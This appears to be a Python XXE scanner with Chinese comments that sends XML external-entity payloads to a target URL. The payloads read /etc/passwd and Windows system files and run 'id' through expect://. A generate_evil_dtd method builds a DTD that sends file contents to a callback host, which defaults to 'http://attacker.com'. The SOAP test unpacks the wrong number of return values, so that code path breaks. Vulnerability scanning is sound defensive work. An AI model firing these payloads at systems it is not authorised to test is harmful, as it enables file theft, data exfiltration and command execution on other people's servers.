"""
XXE (XML External Entity) 檢測器
OWASP A05:2021 - Security Misconfiguration

檢測 XML 解析器的外部實體注入漏洞
"""

import time
from typing import List, Optional
from dataclasses import dataclass
import requests
from lxml import etree


@dataclass
class XXEFinding:
    """XXE 檢測結果"""
    type: str
    parameter: str
    payload: str
    evidence: str
    severity: str
    owasp: str
    success: bool
    response_time_ms: Optional[int] = None


class XXEDetector:
    """XML External Entity 檢測器"""
    
    def __init__(self, callback_server: str = "http://attacker.com", timeout: int = 10):
        """
        初始化 XXE 檢測器
        
        Args:
            callback_server: 回調服務器地址（用於 Blind XXE）
            timeout: 請求超時時間（秒）
        """
        self.callback_server = callback_server
        self.timeout = timeout
        self.payloads = self._generate_payloads()
    
    def _generate_payloads(self) -> List[str]:
        """生成 XXE payloads"""
        return [
            # 基礎 XXE (文件讀取)
            f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>''',
            
            # Windows 文件讀取
            f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/system.ini">
]>
<foo>&xxe;</foo>''',
            
            # Blind XXE (Out-of-Band)
            f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "{self.callback_server}/evil.dtd">
  %xxe;
]>
<foo>test</foo>''',
            
            # Parameter Entity Injection
            f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "{self.callback_server}/evil.dtd">
  %dtd;
]>
<foo>&send;</foo>''',
            
            # PHP Expect
            f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<foo>&xxe;</foo>''',
            
            # 內部 DTD Trick (Java)
            f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<foo>test</foo>''',
        ]
    
    def test_xxe(self, url: str, param: str, method: str = 'POST') -> List[XXEFinding]:
        """
        測試 XXE 漏洞
        
        基於 PortSwigger 和 OWASP 的 XXE 檢測技術:
        1. 經典文件外洩 (file://)
        2. Blind XXE (OOB with DTD)
        3. Parameter Entity Injection
        4. Error-based XXE
        5. XInclude attacks
        
        Args:
            url: 目標 URL
            param: 參數名稱
            method: HTTP 方法
            
        Returns:
            發現的 XXE 漏洞列表
        """
        findings = []
        
        for i, payload in enumerate(self.payloads):
            start_time = time.time()
            
            try:
                # 發送請求
                if method.upper() == 'POST':
                    resp = requests.post(
                        url,
                        data={param: payload},
                        headers={'Content-Type': 'application/xml'},
                        timeout=self.timeout,
                        allow_redirects=False
                    )
                else:
                    resp = requests.get(
                        url,
                        params={param: payload},
                        timeout=self.timeout,
                        allow_redirects=False
                    )
                
                response_time = int((time.time() - start_time) * 1000)
                
                # 分析響應
                vulnerable, evidence, vuln_type = self._analyze_response(resp, payload)
                
                if vulnerable:
                    findings.append(XXEFinding(
                        type=vuln_type,
                        parameter=param,
                        payload=payload[:100] + '...' if len(payload) > 100 else payload,
                        evidence=evidence[:200],
                        severity='Critical' if 'root:' in evidence or 'Administrator' in evidence else 'High',
                        owasp='A05:2021',
                        success=True,
                        response_time_ms=response_time
                    ))
                    
                    # 找到嚴重漏洞就停止
                    if 'Critical' in findings[-1].severity:
                        break
                    
            except requests.exceptions.Timeout:
                # 超時可能表示成功的 Blind XXE
                if 'callback' in payload.lower() or 'evil.dtd' in payload:
                    findings.append(XXEFinding(
                        type='XXE (Possible Blind XXE)',
                        parameter=param,
                        payload=payload[:100] + '...',
                        evidence='Request timed out during OOB attempt - possible XXE with DNS/HTTP callback',
                        severity='Medium',
                        owasp='A05:2021',
                        success=False,
                        response_time_ms=self.timeout * 1000
                    ))
                
            except requests.exceptions.ConnectionError:
                # 連接錯誤可能表示 SSRF/XXE 嘗試訪問內部資源
                if 'file://' in payload or 'expect://' in payload:
                    findings.append(XXEFinding(
                        type='XXE (Possible - Connection Error)',
                        parameter=param,
                        payload=payload[:100] + '...',
                        evidence='Connection error - server may be attempting to access local resource',
                        severity='Medium',
                        owasp='A05:2021',
                        success=False
                    ))
                
            except Exception as e:
                # 其他錯誤可能暴露有用信息
                error_msg = str(e).lower()
                if any(keyword in error_msg for keyword in ['xml', 'entity', 'dtd', 'parse']):
                    findings.append(XXEFinding(
                        type='XXE (Possible - Parser Error)',
                        parameter=param,
                        payload=payload[:100] + '...',
                        evidence=f'XML parser error: {str(e)[:100]}',
                        severity='Low',
                        owasp='A05:2021',
                        success=False
                    ))
        
        return findings
    
    def _analyze_response(self, response: requests.Response, payload: str) -> tuple[bool, str, str]:
        """
        分析響應判斷是否存在 XXE
        
        基於多種檢測技術:
        - 文件內容洩漏檢測
        - XML 解析器錯誤分析
        - 響應時間異常
        - 響應大小異常
        - HTTP 狀態碼分析
        
        Returns:
            (是否存在漏洞, 證據, 漏洞類型)
        """
        text = response.text
        status_code = response.status_code
        
        # 1. 檢查文件內容洩漏
        file_indicators = {
            'root:': ('XXE File Disclosure (/etc/passwd)', '/etc/passwd'),
            'daemon:': ('XXE File Disclosure (/etc/passwd)', '/etc/passwd'),
            '[boot loader]': ('XXE File Disclosure (boot.ini)', 'Windows boot.ini'),
            '[extensions]': ('XXE File Disclosure (system.ini)', 'Windows system.ini'),
            'Windows Registry': ('XXE File Disclosure (Windows Registry)', 'Windows Registry'),
            'Administrator': ('XXE File Disclosure (Windows)', 'Windows system file'),
            'uid=': ('XXE Command Injection (expect://)', 'Command output'),
            'gid=': ('XXE Command Injection (expect://)', 'Command output'),
        }
        
        for indicator, (vuln_type, location) in file_indicators.items():
            if indicator in text:
                evidence = f"{location} content leaked: {text[:200]}"
                return True, evidence, vuln_type
        
        # 2. 檢查 XML 解析錯誤（基於錯誤的 XXE）
        error_patterns = [
            ('cannot be opened', 'XXE Error-Based (File Access Attempt)'),
            ('No such file', 'XXE Error-Based (File Access Attempt)'),
            ('Permission denied', 'XXE Error-Based (File Access Attempt)'),
            ('java.io.FileNotFoundException', 'XXE Error-Based (Java Parser)'),
            ('javax.xml.stream.XMLStreamException', 'XXE Error-Based (Java Parser)'),
            ('org.xml.sax.SAXParseException', 'XXE Error-Based (Java Parser)'),
            ('SAXParserException', 'XXE Error-Based (XML Parser)'),
            ('DOCTYPE is disallowed', 'XXE Configuration Issue (DOCTYPE Blocked)'),
            ('ENTITY is disallowed', 'XXE Configuration Issue (ENTITY Blocked)'),
            ('External entity', 'XXE Configuration Issue (External Entity)'),
        ]
        
        for pattern, vuln_type in error_patterns:
            if pattern in text:
                evidence = f"Parser error detected: {text[:200]}"
                return True, evidence, vuln_type
        
        # 3. 檢查 DTD 處理錯誤
        if 'DTD' in text and any(keyword in text for keyword in ['error', 'exception', 'forbidden', 'blocked']):
            evidence = f"DTD processing error: {text[:200]}"
            return True, evidence, 'XXE DTD Processing Error'
        
        # 4. 檢查響應長度異常（可能表示數據外洩）
        if len(text) > 10000:  # 異常大的響應
            # 檢查是否包含二進制內容或大量數據
            if len(set(text)) > 100:  # 高熵值
                evidence = f"Abnormally large response ({len(text)} bytes) - possible data exfiltration"
                return True, evidence, 'XXE Data Exfiltration (Large Response)'
        
        # 5. 檢查是否暴露內部路徑
        path_indicators = ['/usr/', '/etc/', '/var/', 'C:\\', 'D:\\', '/home/']
        if any(path in text for path in path_indicators):
            evidence = f"Internal path disclosed: {text[:200]}"
            return True, evidence, 'XXE Path Disclosure'
        
        # 6. 檢查服務器端響應時間（SSRF 嘗試可能導致延遲）
        # 注意: 這個需要在調用函數中處理
        
        # 7. 檢查 HTTP 狀態碼異常
        if status_code == 500:
            # 500 錯誤可能是 XXE 導致的
            if any(keyword in text.lower() for keyword in ['xml', 'parse', 'entity', 'dtd']):
                evidence = f"HTTP 500 with XML-related error: {text[:200]}"
                return True, evidence, 'XXE Server Error'
        
        return False, "", ""
    
    def test_with_soap(self, url: str) -> List[XXEFinding]:
        """
        測試 SOAP 端點的 XXE
        
        Args:
            url: SOAP 端點 URL
            
        Returns:
            發現的 XXE 漏洞列表
        """
        findings = []
        
        # SOAP XXE payload
        soap_payload = f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <m:GetUser xmlns:m="http://example.com/">
      <m:UserId>&xxe;</m:UserId>
    </m:GetUser>
  </soap:Body>
</soap:Envelope>'''
        
        try:
            resp = requests.post(
                url,
                data=soap_payload,
                headers={
                    'Content-Type': 'text/xml; charset=utf-8',
                    'SOAPAction': 'GetUser'
                },
                timeout=self.timeout
            )
            
            vulnerable, evidence = self._analyze_response(resp, soap_payload)
            
            if vulnerable:
                findings.append(XXEFinding(
                    type='XXE in SOAP',
                    parameter='SOAP Body',
                    payload=soap_payload[:100] + '...',
                    evidence=evidence,
                    severity='High',
                    owasp='A05:2021',
                    success=True
                ))
                
        except Exception as e:
            pass
        
        return findings
    
    def check_callback_received(self) -> bool:
        """
        檢查是否收到 OOB 回調
        
        Note: 實際實現需要配合 Burp Collaborator 或自建回調服務器
        
        Returns:
            是否收到回調
        """
        # 這裡需要實現回調服務器的檢查邏輯
        # 可以通過查詢回調服務器的日志或使用 Burp Collaborator API
        return False
    
    def generate_evil_dtd(self) -> str:
        """
        生成 evil.dtd 文件內容（用於 Blind XXE）
        
        Returns:
            DTD 文件內容
        """
        return f'''<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '{self.callback_server}/?data=%file;'>">
%eval;
%exfiltrate;'''


# 使用示例
if __name__ == "__main__":
    detector = XXEDetector(callback_server="http://your-callback-server.com")
    
    # 測試 XXE
    findings = detector.test_xxe(
        url="http://example.com/api/upload",
        param="xml_data",
        method="POST"
    )
    
    for finding in findings:
        print(f"[{finding.severity}] {finding.type}")
        print(f"  Parameter: {finding.parameter}")
        print(f"  Evidence: {finding.evidence}")
        print()
